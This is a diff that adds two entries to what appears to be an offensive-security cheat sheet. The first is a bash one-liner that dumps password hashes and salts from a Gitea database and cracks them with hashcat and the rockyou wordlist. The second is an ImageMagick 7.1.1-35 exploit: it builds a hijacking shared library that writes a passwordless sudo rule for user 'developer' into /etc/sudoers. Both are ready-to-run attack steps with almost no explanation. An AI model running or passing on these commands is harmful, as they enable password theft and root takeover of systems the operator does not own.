@@ -2562,7 +2562,65 @@ order_by - uses _literal_as_label_reference (NOT SAFE)
 join     - uses model attributes to resolve relation (SAFE)
 ```
 
-- 
+---------------
+
+### Dumping Gitea Hashes from `gitea.db`
+
+---------------
+
+- Use this one liner-:
+```bash
+sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes
+```
+
+![image](https://github.com/user-attachments/assets/1f0735a9-6c0b-4965-ab37-73e6f246798b)
+
+- Then, Crack with hashcat
+
+```bash
+hashcat gitea.hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --user
+```
+- To check the passwords with `--show`
+
+```bash
+hashcat --show gitea.hashes --user
+```
+
+-------------------
+
+### Image magick 7.1.1-35 exploit
+
+------------------
+
+- Confirm version with `magick --version`
+
+![image](https://github.com/user-attachments/assets/a6d2aee8-cf7c-4ed8-a55e-728b2da9cfe2)
+
+- In current working directory,create this shared library file with the code below
+
+```bash
+gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor)) void init(){
+  system("echo 'developer ALL=(ALL:ALL) NOPASSWD: ALL' >> /etc/sudoers");
+  exit(0);
+}
+EOF
+```
+
+-----------------------
+
+### REFERENCE
+
+------------------------
+
+- [ImageMagick](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8)
+
+-----------------------
+
 
 
 
